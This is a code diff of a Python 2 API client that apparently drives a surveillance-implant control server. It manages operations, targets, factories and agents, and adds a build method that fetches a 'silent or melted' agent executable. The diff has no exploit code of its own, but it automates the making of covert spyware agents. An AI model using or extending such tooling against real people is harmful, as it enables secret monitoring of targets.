@@ -4,6 +4,7 @@ import cookielib
 import json
 import subprocess,os
 
+
 class API:
 
     def __init__(self, host, user, passwd):
@@ -44,11 +45,21 @@ class API:
         except HTTPError as e:
             print "Error processing %s: %s" % (link, e)
 
-    def call(self, api_name, data={}):
+    def call(self, api_name, data={}, binary=False):
+        
         link = 'https://%s/%s' % (self.host, api_name)
         resp = self.post_response(link, self.cookie, json.dumps(data))
-        result = json.loads(resp)
-        return result
+        if binary:
+            return resp 
+
+        try:            
+            result = json.loads(resp)
+            return result
+        except Exception, e:
+            print e
+            print "error: ",resp
+            raise e
+       
 
     def call_get(self, api_name):
         link = 'https://%s/%s' % (self.host, api_name)
@@ -89,13 +100,12 @@ class API:
 
     def operation(self, operation):
         operations = self.call_get('operation')
-        ret = [op['_id'] for op in operations if op['name'] == operation]
+        ret = [ op['_id'] for op in operations if op['name'] == operation ]
         return ret[0] if ret else None
 
     def target_delete(self, target_id):
         """ Delete a given target """
         return self.call('target/destroy', {'_id': target_id })
-
 
     def target_create(self, operation_id, name, desc):
         """ Create a given target """
@@ -103,12 +113,13 @@ class API:
         target =  self.call('target/create', data)
         return target['_id']
 
-    def factory_create(self, operation_id, target_id, name, desc):
+    def factory_create(self, operation_id, target_id, ftype, name, desc):
         """ Create a factory """
-        data = {'name': name, 'desc': desc, 'operation': operation_id, 'target': target_id }
-        return self.call('factory/create', data)
+        data = {'name': name, 'desc': desc, 'operation': operation_id, 'target': target_id, 'type': ftype }
+        factory = self.call('agent/create', data)
+        return factory['_id']
 
-    def factory_add_config(factory_id, config):
+    def factory_add_config(self, factory_id, config):
         data = {'_id': factory_id, 'config': config }
         return self.call('agent/add_config', data)
 
@@ -151,7 +162,7 @@ class API:
         
         t = json.loads(targets)
 
-        #[ s['id'] in t if s['name'] == target_name][0]
+        #[ s['id'] for s in t if s['name'] == target_name][0]
         for s in t:
             if s['name'] == target_name:
                 return s['_id']
@@ -169,6 +180,7 @@ class API:
         resp = self.get_response(baselink, self.cookie)
         agents = json.loads(resp)
 
+        [  ]
         for agent in agents:
             
             if agent["ident"] == factory and agent["_kind"] == "agent":
@@ -177,7 +189,7 @@ class API:
                 dev = json.loads(resp)
                 ins[device] = dev
 
-            return (agent["ident"],agent['_id'])
+                return (agent["ident"],agent['_id'])
 
     def delete_instance(self, instance):
         """ Delete a given instance
@@ -221,28 +233,20 @@ class API:
         
         print "[*] Conf saved"
     
-    def build(self, param_file, factory, out_file):
+    def build(self, factory, params, out_file):
         """ Build Silent or Melted Exe 
         @param param_file 
         @param factory
         @param out_file
         """
-        jcontent = open(param_file, 'r').read()
-        params = json.loads(jcontent)
-        
-        params['factory'] = '{ "_id":"%s" }' % factory
-        params['melt'] = {}
-        
-        #params['melt'] <= exe input file content
-        
-        # sign certificate
-        
+
+        params['factory'] = { "_id": "%s" % factory } 
         print "[*] Build params: \n%s" % json.dumps(params)
-        link  = 'https://%s/build' % self.host
-        resp = self.post_response(link, json.dumps(params))
-        
+        #link  = 'https://%s/build' % self.host
+        #resp = self.post_response(link, json.dumps(params))
+        resp = self.call('build', params, True)
         
         out = open(out_file, 'wb')
         out.write(resp)
         
-        print "[*] bytes saved to %s"
+        print "[*] bytes saved to %s" % out_file
